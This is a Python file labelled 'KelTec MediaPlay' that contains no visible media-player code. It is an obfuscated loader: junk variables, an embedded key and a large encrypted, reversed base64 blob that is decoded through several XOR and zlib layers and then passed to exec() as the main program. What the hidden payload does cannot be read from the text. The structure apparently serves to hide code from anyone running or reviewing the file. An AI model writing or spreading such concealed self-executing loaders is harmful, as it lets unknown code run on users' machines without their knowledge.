# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 953759 ^ 727537
_lx1_1 = len("fde3f4")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-628128)
_lx3_3 = 324426 * 0
_lx4_4 = 780868 ^ 673562
_K = 'd83aa06f5d6f041f5182531623a07e0c0ec0a00d9884abb54eb8a7d848bf730b'
_M = '2u7lgqydDWjLZQ=='
_D = '==Q8jQEt1VSylrCEh5mkFjeCY8sd5iKk03Riex8B9VUFp6EORGQY0qY5EmGcYYAuvIk1XwfCPZN5G7/+YrWuIWOn1UGjOmzWFL6+4W8qzwk2IyCWL1HAJlsNZAy0argLcNgm5eH2hOjAIeyro1gan3qq5ld8t+FzHAcMDFAwuMyMp+TQuyVGbQt4JWBIf3991du2H51ie+CkSsraTjZ6o7jeHOfnYiJ9a4LxxzRZ8csgi218lFNMBokGYKdA1FKzzJhsP16C1AkSyqg61/q0fq4fOd4Cr/+iEti5UmsZpM2ULtMd+fHaOKkbtfuMjtU79fPxsQe4IdiGtYQHYD0/KiOa5UVo4vZ9loziFhh/cqsHrjW9XXPbPy4C9L2HRImPM9KIEGnAJiW41OTYDcM+MQSRYZgwg3FJTilCDjvXcu0Ve9LHrk0CWTn9PAUgd2tBvz+fi8ewNrI1P+q6ll7lzkftNnsyK3qkMw7cxoTELiwz+wPFUWMsxmrk8gb/KpSN+LpCdeU3czcccvScmRrgkKk15iHv+cpiHG/5/hEexwpiD/MMWNcqhSNC0kt+q68RSyxgOQHjSjl0AssFBf+6Cij+nHCXDunWJtsAg5RM8c/FDQ0pknfVJ1yHhQzTkaZwUbvguOwqwJw690C/Ov4USFr8iD3oOYzS5B3IZWfsSkSlzFfieieOLKIKwhh4HK6u+uTj56OyX1YV6lFRqSSwqY4vWvZVW/zPTRXLsiiJZRdv58JR+bVl+neVwR7REe4Uq+QEr2RvPzKttAaa4gnlVNuek7cR82HUPrG9yHff31P2IAiF4KRyoWzLMCJSC5PLtBnLRNKmaMHyElzyDRjmpiCR+U8ICaDsvtioQAXb1jRXxeNrVwkISOHlv4o4w5+j+t4zYl7kwxHGzhXYBrI8wlBs9fIDiNzpue+DWEIV3mX37/tFfUiaq6abWuZNeY34tWr7UEQQf2VMz9PdTbhiu2mjDGa4OFaew9Obap4UDpVoXQdHoQNgNHrrtPsJOy0RFTLiY3mYRUtlkAtTuBREdL6SDj/sjAXV2VtGhoWhE1Tf3c6ykq2sZj2xvgtQs3t7UH1VIoG3KZphh9CLSqjtxTFYojIak2qIL2IKt2O3oVo+lQBljD5kTgyOJEhYH8HPNNg4InanJU8jenKAXwg0nupZQXLvcv5sByQjha6FXV8K6yfDwSBvp8IdXTiQ03F9/nTgAiZslgqfIeKAY/a4ClRkwxqV3xGE9unStaatH92c4QF9CwFmdLPxHY9tWQrNyF6qTJziFBi2zXveGvLt5XjSQq4Y5kVsNOlIkGow7ZFUID3oSTYjBGrYGQISZ3BV9x0u9m2wvRNVx/K8+Jr8WULHvprWicJkqHg14caSTiXGMpez3cZb486ta0WokNF+iDuRz9IyIzhYTTAg/Xwoms464NJiKKLBBpIbZdY1PrTJJtJXAUZ5tC3Z18Bmz4hhE0MJq4Hh50uRA8D3JfAbC5+wGigAyEvDpqXNsCkuvb+P2rBCSN1CTLKKvi3pdUvn83yyHE97gVKZo/Gg4lmAHLQXe2sNgR6F4sDbFEY0XAgZZRqpfeNwnQIMdvkm+6gm6Uv/WyUAwNFqUXloWLB/C5oyu25KZyrvZBJ+Vcw5EBg0yh9yJ+L7+5IkyK7hSsUiMu3oOMQ0wTwuK2JSnO41VudXyQVz3kCYBflby/xDknmZqMmJLZcHbsDJni3/4WFhHKc7lg6dYdmYCtR3j+apv/iEHRMp5Bmx5mcFoqGxd/moA+VoaP60gnAcj/BXSRTJbn5J7WEc/aykmidiZfSIMs3GhpQ40iZt8Lg5VvIhhr/z'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})
